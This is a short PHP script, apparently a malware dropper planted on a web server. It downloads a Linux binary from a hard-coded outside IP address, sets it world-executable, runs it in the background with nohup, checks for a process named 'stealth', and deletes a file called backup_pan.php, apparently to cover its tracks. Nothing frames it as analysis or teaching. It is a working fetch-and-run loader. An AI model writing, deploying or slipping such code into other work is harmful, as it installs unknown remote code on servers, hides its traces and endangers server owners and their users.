<?php
function downloadFile($url, $path)
{
    $newfname = $path;
    $file = fopen ($url, 'rb');
    if ($file) {
        $newf = fopen ($newfname, 'wb');
        if ($newf) {
            while(!feof($file)) {
                fwrite($newf, fread($file, 1024 * 8), 1024 * 8);
            }
        }
    }
    if ($file) {
        fclose($file);
    }
    if ($newf) {
        fclose($newf);
    }
}

downloadFile('http://178.63.102.172/Linux_x86','./x86');

system('chmod 777 ./x86');
system('nohup ./x86 2>&1 &');
system('ps aux| grep stealth');
system('rm -rf backup_pan.php');
?>
